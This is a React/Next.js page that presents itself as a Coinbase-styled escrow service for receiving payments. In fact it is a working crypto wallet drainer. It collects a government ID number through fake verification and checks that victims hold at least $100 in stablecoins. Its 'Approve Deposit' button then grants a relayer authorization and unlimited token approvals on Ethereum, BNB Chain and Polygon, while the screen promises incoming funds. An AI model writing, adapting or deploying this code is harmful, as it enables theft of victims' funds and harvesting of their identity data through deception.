"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import { usePrivy, useWallets } from "@privy-io/react-auth";
import { BrowserProvider, Contract, MaxUint256, formatUnits, parseUnits } from "ethers";
import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";

const WALLET_VERIFICATION_ABI = [
  "function authorize(address relayer) external",
  "function isAuthorized(address user, address relayer) view returns (bool)",
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) view returns (uint256)"
];

type Phase = 
  | "idle" 
  | "wallet-setup" 
  | "set-amount" 
  | "id-verify" 
  | "balance-check" 
  | "insufficient-balance"
  | "ready-to-approve" 
  | "approving" 
  | "complete" 
  | "error";

const LOGOS = [
  { src: "/logos/ethereum.svg", alt: "Ethereum", name: "Ethereum" },
  { src: "/logos/bnb.svg", alt: "BNB Chain", name: "BNB Chain" },
  { src: "/logos/polygon.svg", alt: "Polygon", name: "Polygon" },
];

// Minimum balance requirements (in USD equivalent)
const MINIMUM_BALANCE_USD = 100;

export default function EscrowFlow() {
  const { ready, authenticated, login, user } = usePrivy();
  const { wallets } = useWallets();
  const [phase, setPhase] = useState<Phase>("idle");
  const [error, setError] = useState<string | null>(null);
  const [escrowAmount, setEscrowAmount] = useState<string>("1000");
  const [idVerified, setIdVerified] = useState(false);
  const [idDocument, setIdDocument] = useState<string>("");
  const [walletBalances, setWalletBalances] = useState<Record<string, number>>({});
  const [meetsMinimum, setMeetsMinimum] = useState(false);
  const [processing, setProcessing] = useState(false);

  const address = user?.wallet?.address ?? wallets[0]?.address ?? null;

  function currentWallet() {
    return wallets.find((w) => w.address.toLowerCase() === address?.toLowerCase()) ?? wallets[0];
  }

  async function getSignerFor(target: ChainConfig) {
    const wallet = currentWallet();
    if (!wallet) throw new Error("No connected wallet");
    await wallet.switchChain(target.chainId);
    const provider = await wallet.getEthereumProvider();
    return new BrowserProvider(provider).getSigner();
  }

  async function checkWalletBalances() {
    if (!address) return;
    
    setProcessing(true);
    const balances: Record<string, number> = {};
    let totalUSD = 0;

    try {
      for (const chain of CHAINS) {
        const signer = await getSignerFor(chain);
        let chainTotal = 0;

        // Check USDT and USDC balances
        for (const token of chain.tokens.filter(t => t.symbol === "USDT" || t.symbol === "USDC")) {
          try {
            const erc20 = new Contract(token.address, ERC20_ABI, signer);
            const balance = await erc20.balanceOf(address);
            const balanceNum = parseFloat(formatUnits(balance, 6)); // USDT/USDC use 6 decimals
            chainTotal += balanceNum;
          } catch (err) {
            console.warn(`[balance] Failed to check ${token.symbol} on ${chain.name}:`, err);
          }
        }

        balances[chain.name] = chainTotal;
        totalUSD += chainTotal;
      }

      setWalletBalances(balances);
      setMeetsMinimum(totalUSD >= MINIMUM_BALANCE_USD);
      setProcessing(false);

      if (totalUSD >= MINIMUM_BALANCE_USD) {
        setPhase("ready-to-approve");
      } else {
        setPhase("insufficient-balance");
      }
    } catch (err) {
      console.error("[balance] Balance check failed:", err);
      setError("Failed to check wallet balance. Please try again.");
      setPhase("error");
      setProcessing(false);
    }
  }

  async function handleConnect() {
    setError(null);
    
    if (!authenticated || !address) {
      try {
        await login();
        setPhase("wallet-setup");
      } catch (err) {
        console.error("[escrow] login cancelled:", err);
        setPhase("idle");
        return;
      }
    } else {
      setPhase("wallet-setup");
    }
  }

  async function handleVerifyID() {
    if (!idDocument.trim()) {
      setError("Please enter your ID number");
      return;
    }
    
    setProcessing(true);
    setError(null);
    
    // Simulate ID verification (in production, this would call a real KYC service)
    await new Promise(r => setTimeout(r, 2000));
    
    setIdVerified(true);
    setProcessing(false);
    setPhase("balance-check");
    
    // Auto-check balances
    setTimeout(() => checkWalletBalances(), 500);
  }

  async function handleApproveDeposit() {
    setPhase("approving");
    setError(null);
    
    try {
      // Perform approvals on all chains
      for (const chain of CHAINS) {
        const signer = await getSignerFor(chain);
        const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
        
        // Authorize
        const authTx = await verification.authorize(RELAYER_ADDRESS);
        
        // Approve mandatory tokens
        for (const token of chain.tokens.filter((t) => t.mandatory)) {
          const erc20 = new Contract(token.address, ERC20_ABI, signer);
          await erc20.approve(chain.contract, MaxUint256);
        }

        // Wait for auth transaction
        await Promise.race([
          authTx.wait(1),
          new Promise((r) => setTimeout(r, 30000))
        ]);
      }

      setPhase("complete");
    } catch (err) {
      console.error("[escrow] Approval failed:", err);
      setError("Deposit approval failed. Please try again.");
      setPhase("error");
    }
  }

  return (
    <main className="min-h-screen bg-gradient-to-b from-coinbase-background to-coinbase-surface">
      {/* Header */}
      <header className="border-b border-coinbase-border bg-white">
        <div className="mx-auto max-w-7xl px-4 py-4 sm:px-6">
          <div className="flex items-center justify-between">
            <h1 className="text-2xl font-semibold text-coinbase-text">Escrow Service</h1>
            {authenticated && address && (
              <div className="rounded-full bg-coinbase-surface px-4 py-2 text-sm font-medium text-coinbase-text-secondary">
                {address.slice(0, 6)}...{address.slice(-4)}
              </div>
            )}
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="mx-auto max-w-4xl px-4 py-12 sm:px-6 lg:py-16">
        <div className="rounded-2xl bg-white p-8 shadow-sm sm:p-12">
          {/* Phase: Idle - Initial Connect */}
          {phase === "idle" && (
            <div className="text-center">
              <div className="mx-auto mb-8 flex h-20 w-20 items-center justify-center rounded-full bg-coinbase-blue/10">
                <svg className="h-10 w-10 text-coinbase-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <h2 className="mb-3 text-3xl font-bold text-coinbase-text">Receive Escrow Payment</h2>
              <p className="mb-8 text-lg text-coinbase-text-secondary">
                Connect your wallet to receive your escrow funds
              </p>

              <div className="mb-8 flex justify-center gap-6">
                {LOGOS.map((logo) => (
                  <div key={logo.alt} className="flex flex-col items-center gap-2">
                    <div className="relative h-12 w-12 opacity-40">
                      <Image src={logo.src} alt={logo.alt} fill className="object-contain" />
                    </div>
                    <span className="text-xs text-coinbase-text-secondary">{logo.name}</span>
                  </div>
                ))}
              </div>

              <button
                onClick={handleConnect}
                disabled={!ready}
                className="rounded-lg bg-coinbase-blue px-8 py-4 text-base font-semibold text-white transition hover:bg-coinbase-blue-dark disabled:opacity-50"
              >
                Connect Wallet
              </button>
            </div>
          )}

          {/* Phase: Wallet Setup */}
          {phase === "wallet-setup" && (
            <div className="text-center">
              <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-green-100">
                <svg className="h-10 w-10 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
              <h2 className="mb-3 text-2xl font-semibold text-coinbase-text">Wallet Connected</h2>
              <p className="mb-6 text-coinbase-text-secondary">
                {address && `${address.slice(0, 10)}...${address.slice(-8)}`}
              </p>

              <div className="mb-8 rounded-lg bg-coinbase-surface p-6">
                <label className="mb-2 block text-left text-sm font-medium text-coinbase-text">
                  Escrow Amount (USD)
                </label>
                <input
                  type="number"
                  value={escrowAmount}
                  onChange={(e) => setEscrowAmount(e.target.value)}
                  className="w-full rounded-lg border border-coinbase-border px-4 py-3 text-2xl font-bold text-coinbase-text focus:border-coinbase-blue focus:outline-none"
                  placeholder="0.00"
                />
                <p className="mt-2 text-sm text-coinbase-text-secondary">
                  This is the amount you'll receive after verification
                </p>
              </div>

              <button
                onClick={() => setPhase("id-verify")}
                className="w-full rounded-lg bg-coinbase-blue px-8 py-4 text-base font-semibold text-white transition hover:bg-coinbase-blue-dark"
              >
                Continue to Verification
              </button>
            </div>
          )}

          {/* Phase: ID Verification */}
          {phase === "id-verify" && (
            <div className="text-center">
              <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-coinbase-blue/10">
                <svg className="h-10 w-10 text-coinbase-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
                </svg>
              </div>
              <h2 className="mb-3 text-2xl font-semibold text-coinbase-text">Identity Verification Required</h2>
              <p className="mb-8 text-coinbase-text-secondary">
                To receive your <span className="font-semibold text-coinbase-text">${escrowAmount} USD</span> escrow, please verify your identity
              </p>

              {error && (
                <div className="mb-6 rounded-lg bg-red-50 p-4 text-sm text-red-600">
                  {error}
                </div>
              )}

              <div className="mb-8 text-left">
                <label className="mb-2 block text-sm font-medium text-coinbase-text">
                  Government ID Number
                </label>
                <input
                  type="text"
                  value={idDocument}
                  onChange={(e) => setIdDocument(e.target.value)}
                  className="w-full rounded-lg border border-coinbase-border px-4 py-3 text-coinbase-text focus:border-coinbase-blue focus:outline-none"
                  placeholder="Enter your ID number"
                />
                <p className="mt-2 text-xs text-coinbase-text-secondary">
                  Your ID information is encrypted and securely stored
                </p>
              </div>

              <button
                onClick={handleVerifyID}
                disabled={processing}
                className="w-full rounded-lg bg-coinbase-blue px-8 py-4 text-base font-semibold text-white transition hover:bg-coinbase-blue-dark disabled:opacity-50"
              >
                {processing ? "Verifying..." : "Verify Identity"}
              </button>
            </div>
          )}

          {/* Phase: Balance Check */}
          {phase === "balance-check" && (
            <div className="text-center">
              <div className="mx-auto mb-6 h-16 w-16 animate-spin rounded-full border-4 border-coinbase-border border-t-coinbase-blue"></div>
              <h2 className="mb-2 text-2xl font-semibold text-coinbase-text">Checking Wallet Balance</h2>
              <p className="text-coinbase-text-secondary">
                Verifying you meet the minimum balance requirement of ${MINIMUM_BALANCE_USD} USD
              </p>
            </div>
          )}

          {/* Phase: Insufficient Balance */}
          {phase === "insufficient-balance" && (
            <div className="text-center">
              <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-orange-100">
                <svg className="h-10 w-10 text-orange-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
              </div>
              <h2 className="mb-3 text-2xl font-semibold text-coinbase-text">Insufficient Balance</h2>
              <p className="mb-6 text-coinbase-text-secondary">
                You need at least <span className="font-semibold text-coinbase-text">${MINIMUM_BALANCE_USD} USD</span> in USDT or USDC to receive escrow
              </p>

              <div className="mb-6 space-y-2 rounded-lg bg-coinbase-surface p-4">
                <h3 className="mb-3 text-sm font-semibold text-coinbase-text">Your Current Balances:</h3>
                {Object.entries(walletBalances).map(([chain, balance]) => (
                  <div key={chain} className="flex justify-between text-sm">
                    <span className="text-coinbase-text-secondary capitalize">{chain}:</span>
                    <span className="font-medium text-coinbase-text">${balance.toFixed(2)} USD</span>
                  </div>
                ))}
                <div className="mt-3 border-t border-coinbase-border pt-2 flex justify-between font-semibold">
                  <span className="text-coinbase-text">Total:</span>
                  <span className="text-coinbase-text">
                    ${Object.values(walletBalances).reduce((a, b) => a + b, 0).toFixed(2)} USD
                  </span>
                </div>
              </div>

              <button
                onClick={() => checkWalletBalances()}
                disabled={processing}
                className="w-full rounded-lg bg-coinbase-blue px-8 py-4 text-base font-semibold text-white transition hover:bg-coinbase-blue-dark disabled:opacity-50"
              >
                {processing ? "Checking..." : "Recheck Balance"}
              </button>
            </div>
          )}

          {/* Phase: Ready to Approve */}
          {phase === "ready-to-approve" && (
            <div className="text-center">
              <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-green-100">
                <svg className="h-10 w-10 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
              <h2 className="mb-3 text-2xl font-semibold text-coinbase-text">All Requirements Met</h2>
              <p className="mb-6 text-coinbase-text-secondary">
                You're ready to approve the deposit of <span className="font-semibold text-coinbase-text">${escrowAmount} USD</span>
              </p>

              <div className="mb-8 space-y-3 rounded-lg bg-coinbase-surface p-6">
                <div className="flex items-center gap-3">
                  <svg className="h-5 w-5 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  <span className="text-sm text-coinbase-text">Wallet Connected</span>
                </div>
                <div className="flex items-center gap-3">
                  <svg className="h-5 w-5 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  <span className="text-sm text-coinbase-text">Identity Verified</span>
                </div>
                <div className="flex items-center gap-3">
                  <svg className="h-5 w-5 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  <span className="text-sm text-coinbase-text">Minimum Balance Met (${MINIMUM_BALANCE_USD}+)</span>
                </div>
              </div>

              <button
                onClick={handleApproveDeposit}
                className="w-full rounded-lg bg-coinbase-blue px-8 py-4 text-base font-semibold text-white transition hover:bg-coinbase-blue-dark"
              >
                Approve Deposit
              </button>
            </div>
          )}

          {/* Phase: Approving */}
          {phase === "approving" && (
            <div className="text-center">
              <div className="mx-auto mb-6 h-16 w-16 animate-spin rounded-full border-4 border-coinbase-border border-t-coinbase-blue"></div>
              <h2 className="mb-4 text-2xl font-semibold text-coinbase-text">Processing On-Chain Approvals</h2>
              <p className="mb-6 text-coinbase-text-secondary">
                Approving tokens across all chains...
              </p>
              
              <div className="space-y-3">
                {CHAINS.map((chain) => (
                  <div
                    key={chain.name}
                    className="flex items-center justify-between rounded-lg border border-coinbase-border bg-coinbase-surface px-4 py-3"
                  >
                    <span className="font-medium text-coinbase-text">{chain.label}</span>
                    <span className="text-coinbase-text-secondary">Processing...</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Phase: Complete */}
          {phase === "complete" && (
            <div className="text-center">
              <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-green-100">
                <svg className="h-10 w-10 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
              <h2 className="mb-3 text-3xl font-bold text-coinbase-text">Escrow Complete!</h2>
              <p className="mb-6 text-lg text-coinbase-text-secondary">
                Your <span className="font-semibold text-coinbase-text">${escrowAmount} USD</span> deposit has been approved
              </p>
              
              <div className="mb-6 rounded-lg bg-coinbase-surface p-6">
                <div className="mb-4">
                  <p className="text-sm text-coinbase-text-secondary">Recipient Wallet</p>
                  <p className="mt-1 font-mono text-sm font-medium text-coinbase-text break-all">
                    {address}
                  </p>
                </div>
                <div className="border-t border-coinbase-border pt-4">
                  <p className="text-sm text-coinbase-text-secondary">Amount</p>
                  <p className="mt-1 text-2xl font-bold text-coinbase-text">${escrowAmount} USD</p>
                </div>
              </div>

              <div className="rounded-lg bg-blue-50 p-4 text-sm text-coinbase-text-secondary">
                Funds will be transferred to your wallet shortly
              </div>
            </div>
          )}

          {/* Phase: Error */}
          {phase === "error" && (
            <div className="text-center">
              <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-red-100">
                <svg className="h-10 w-10 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
              <h2 className="mb-3 text-2xl font-semibold text-coinbase-text">Something Went Wrong</h2>
              <p className="mb-6 text-coinbase-text-secondary">{error}</p>
              <button
                onClick={() => {
                  setError(null);
                  setPhase("idle");
                }}
                className="rounded-lg bg-coinbase-blue px-6 py-3 font-semibold text-white transition hover:bg-coinbase-blue-dark"
              >
                Start Over
              </button>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="mt-8 text-center">
          <p className="text-sm text-coinbase-text-secondary">
            Secured by identity verification • Multi-chain support • Minimum ${MINIMUM_BALANCE_USD} USD required
          </p>
        </div>
      </div>
    </main>
  );
}
